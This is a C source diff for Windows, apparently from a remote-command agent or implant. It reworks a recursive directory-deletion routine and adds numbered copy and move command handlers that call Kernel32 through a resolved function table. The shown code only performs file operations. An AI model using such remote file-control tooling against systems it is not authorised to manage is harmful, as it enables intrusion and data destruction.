@@ -69,15 +69,24 @@ FUNC BOOL NaxDeleteTree( PNAX_INSTANCE Nax, PCHAR dir ) {
     pattern[plen + 1] = '\0';
 
     WIN32_FIND_DATAA fd;
-    HANDLE h = Nax->Kernel32.FindFirstFileA( pattern, &fd );
-    if ( h == INVALID_HANDLE_VALUE ) return FALSE;
-
     BOOL ok = TRUE;
-    do {
-        if ( fd.cFileName[0] == '.' &&
-             ( fd.cFileName[1] == '\0' ||
-               ( fd.cFileName[1] == '.' && fd.cFileName[2] == '\0' ) ) )
-            continue;
+
+    for ( ;; ) {
+        HANDLE h = Nax->Kernel32.FindFirstFileA( pattern, &fd );
+        if ( h == INVALID_HANDLE_VALUE ) break;
+
+        BOOL found = FALSE;
+        do {
+            if ( fd.cFileName[0] == '.' &&
+                 ( fd.cFileName[1] == '\0' ||
+                   ( fd.cFileName[1] == '.' && fd.cFileName[2] == '\0' ) ) )
+                continue;
+            found = TRUE;
+            break;
+        } while ( Nax->Kernel32.FindNextFileA( h, &fd ) );
+
+        Nax->Kernel32.FindClose( h );
+        if ( ! found ) break;
 
         CHAR child[MAX_PATH_SIZE];
         UINT32 ci = 0;
@@ -88,15 +97,13 @@ FUNC BOOL NaxDeleteTree( PNAX_INSTANCE Nax, PCHAR dir ) {
         child[ci] = '\0';
 
         if ( fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) {
-            if ( ! NaxDeleteTree( Nax, child ) ) ok = FALSE;
+            if ( ! NaxDeleteTree( Nax, child ) ) { ok = FALSE; break; }
         } else {
             if ( fd.dwFileAttributes & FILE_ATTRIBUTE_READONLY )
                 Nax->Kernel32.SetFileAttributesA( child, FILE_ATTRIBUTE_NORMAL );
-            if ( ! Nax->Kernel32.DeleteFileA( child ) ) ok = FALSE;
+            if ( ! Nax->Kernel32.DeleteFileA( child ) ) { ok = FALSE; break; }
         }
-    } while ( Nax->Kernel32.FindNextFileA( h, &fd ) );
-
-    Nax->Kernel32.FindClose( h );
+    }
 
     if ( ok ) ok = Nax->Kernel32.RemoveDirectoryA( dir );
     return ok;
@@ -365,6 +372,58 @@ FUNC INT CmdLs( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out,
     NaxW16( count_ptr, count );
     *out_len = (UINT32)( wp - out );
     return NAX_OK;
+}
+
+/* ========= [ CMD_CP (0x1A) ] ========= */
+
+FUNC INT CmdCp( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
+    if ( args_len < 3 || args == NULL ) return NAX_ERR_INVAL;
+
+    UINT32 sep = 0;
+    while ( sep < args_len && args[sep] != '\0' ) sep++;
+    if ( sep == 0 || sep >= args_len - 1 ) return NAX_ERR_INVAL;
+
+    CHAR src[MAX_PATH_SIZE];
+    CHAR dst[MAX_PATH_SIZE];
+    UINT32 src_len = ( sep < MAX_PATH_SIZE ) ? sep : (MAX_PATH_SIZE - 1);
+    UINT32 dst_len = ( args_len - sep - 1 < MAX_PATH_SIZE ) ? (args_len - sep - 1) : (MAX_PATH_SIZE - 1);
+    MmCopy( src, args, src_len );
+    src[src_len] = '\0';
+    MmCopy( dst, args + sep + 1, dst_len );
+    dst[dst_len] = '\0';
+
+    if ( Nax->Kernel32.CopyFileA( src, dst, FALSE ) ) {
+        *out_len = 0;
+        return NAX_OK;
+    }
+    NaxWriteWin32Err( out, out_len );
+    return NAX_ERR_FAIL;
+}
+
+/* ========= [ CMD_MV (0x1B) ] ========= */
+
+FUNC INT CmdMv( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
+    if ( args_len < 3 || args == NULL ) return NAX_ERR_INVAL;
+
+    UINT32 sep = 0;
+    while ( sep < args_len && args[sep] != '\0' ) sep++;
+    if ( sep == 0 || sep >= args_len - 1 ) return NAX_ERR_INVAL;
+
+    CHAR src[MAX_PATH_SIZE];
+    CHAR dst[MAX_PATH_SIZE];
+    UINT32 src_len = ( sep < MAX_PATH_SIZE ) ? sep : (MAX_PATH_SIZE - 1);
+    UINT32 dst_len = ( args_len - sep - 1 < MAX_PATH_SIZE ) ? (args_len - sep - 1) : (MAX_PATH_SIZE - 1);
+    MmCopy( src, args, src_len );
+    src[src_len] = '\0';
+    MmCopy( dst, args + sep + 1, dst_len );
+    dst[dst_len] = '\0';
+
+    if ( Nax->Kernel32.MoveFileExA( src, dst, MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED ) ) {
+        *out_len = 0;
+        return NAX_OK;
+    }
+    NaxWriteWin32Err( out, out_len );
+    return NAX_ERR_FAIL;
 }
 
 /* ========= [ CMD_RM (0x27) ] ========= */
